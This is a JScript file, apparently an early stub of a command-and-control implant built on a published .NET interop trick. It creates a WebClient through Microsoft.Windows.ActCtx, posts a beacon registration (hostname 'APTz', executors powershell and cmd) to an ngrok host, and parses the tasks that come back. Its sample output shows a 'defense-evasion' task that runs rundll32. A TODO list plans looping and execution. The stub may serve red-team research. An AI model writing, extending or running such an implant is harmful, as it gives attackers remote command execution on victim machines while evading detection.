//    This file is part of DotNetInteropDemos
//    Copyright (C) James Forshaw 2017
//
//    DotNetInteropDemos is free software: you can redistribute it and/or modify
//    it under the terms of the GNU General Public License as published by
//    the Free Software Foundation, either version 3 of the License, or
//    (at your option) any later version.
//
//    DotNetInteropDemos is distributed in the hope that it will be useful,
//    but WITHOUT ANY WARRANTY; without even the implied warranty of
//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//    GNU General Public License for more details.
//
//    You should have received a copy of the GNU General Public License
//    along with DotNetInteropDemos.  If not, see <http://www.gnu.org/licenses/>.

// Original examples here https://github.com/tyranid/DotNetInteropDemos/blob/master/webclient_textmanifest.js



var manifest = '<?xml version="1.0" encoding="UTF-16" standalone="yes"?><assembly manifestVersion="1.0" xmlns="urn:schemas-microsoft-com:asm.v1"><assemblyIdentity name="System" version="4.0.0.0" publicKeyToken="B77A5C561934E089" /><clrClass clsid="{7D458845-B4B8-30CB-B2AD-FC4960FCDF81}" progid="System.Net.WebClient" threadingModel="Both" name="System.Net.WebClient" runtimeVersion="v4.0.30319" /></assembly>';

try {
	var ax = new ActiveXObject("Microsoft.Windows.ActCtx");
	ax.ManifestText = manifest;
	var obj = ax.CreateObject("System.Net.WebClient");
	//WScript.Echo(obj.DownloadString("https://boomtown.ngrok.io"));
	var JSONString =  '{"Name":"Boomer2","Target":"","Hostname":"APTz","Location":"C:\Users\Mobile\Documents","Platform":"windows","Executors":["psh", "cmd"],"Range":"home","Pwd":"","Sleep":10,"Executing":"","Links":[]}'

	var response = obj.UploadString("http://boomtown.ngrok.io", JSONString);
	WScript.Echo(response);
	
	
	// classic WSH JScript version
	var htmlfile = new ActiveXObject('htmlfile'), JSON;
	htmlfile.write('<meta http-equiv="x-ua-compatible" content="IE=9" />');
	htmlfile.close(JSON = htmlfile.parentWindow.JSON);
	var jsonData = (JSON.parse(response));
	
for (var i = 0; i < jsonData.links.length; i++) {
    var counter = jsonData.links[i];
    WScript.Echo(counter.ID); //
}
	
	
} catch(e) {
	WScript.Echo("Error: " + e.message);
}

/* Sample Output

{"links":[{"ID":"e13e3cb1-6bd9-4f6d-9b72-8baeb5a0b68b","ttp":"ba4452fa-b662-49ef-bd1e-3859b95bcfb6","tactic":"defense-evasion","Executor":"cmd","Request":"rundll32.exe shell32.dll,ShellExec_RunDLL \"C:UsersMobileDocuments\"","Payload":""}]}
TODO:
Loop/Sleep
Parse JSON - Try to find a useful .NET class.
execute 
Return Response.

*/

